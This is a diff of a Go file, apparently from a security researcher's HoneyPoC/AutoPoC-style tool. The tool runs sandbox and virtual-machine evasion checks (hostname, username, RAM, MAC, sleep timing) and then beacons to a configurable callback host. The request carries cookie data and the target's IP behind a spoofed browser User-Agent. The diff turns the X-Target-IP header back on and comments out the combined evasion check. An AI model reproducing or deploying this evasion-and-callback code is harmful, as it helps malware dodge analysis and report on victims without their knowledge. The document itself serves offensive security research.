@@ -1,8 +1,8 @@
 // Massive Work in Progress -Built off the back of AutoPoC and HoneyPoC projects
-// Eventual plan is to have a reverse blacklist of various paths, users and hostnames, if the data matches then run the code, else no hax
-// ZephrFish 2022
-// v0.3
-// Additional Sandbox checks added in following structure
+// Eventual plan is to have a reverse blacklist of various paths, users and hostnames; if the data matches, then run the code, else no hax
+// ZephrFish 2024
+// v0.4
+// Additional Sandbox checks added in the following structure
 // Modify line 208 to your callback host
 
 package main
@@ -161,27 +161,27 @@ func S_SpyCpu(cores int) bool {
 }
 
 // S_SpyAll is used to check if an environment is virtualized by testing all S_Spy checks.
-func S_SpyAll() bool {
-	values := []bool{
-		S_SpyFilepath(),
-		S_SpySleep(),
-		S_SpyTmp(100),
-		S_SpyRam(2048),
-		S_SpyMac(),
-		S_SpyUtc(),
-		S_SpyHostname(),
-		S_SpyUserName(),
-	}
+// func S_SpyAll() bool {
+// 	values := []bool{
+// 		S_SpyFilepath(),
+// 		S_SpySleep(),
+// 		S_SpyTmp(100),
+// 		S_SpyRam(2048),
+// 		S_SpyMac(),
+// 		S_SpyUtc(),
+// 		S_SpyHostname(),
+// 		S_SpyUserName(),
+// 	}
 
-	for s := range values {
-		x := values[s]
-		if x {
-			return true
-		}
-	}
+// 	for s := range values {
+// 		x := values[s]
+// 		if x {
+// 			return true
+// 		}
+// 	}
 
-	return false
-}
+// 	return false
+// }
 
 // Execution check
 func SandExecBlock() bool {
@@ -226,7 +226,7 @@ func main() {
 	// We can change this to whatever we want
 	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36")
 	req.Header.Set("Cookie", str)
-	// req.Header.Set("X-Target-IP", TargetIP)
+	req.Header.Set("X-Target-IP", TargetIP)
 
 	resp, err := client.Do(req)
 
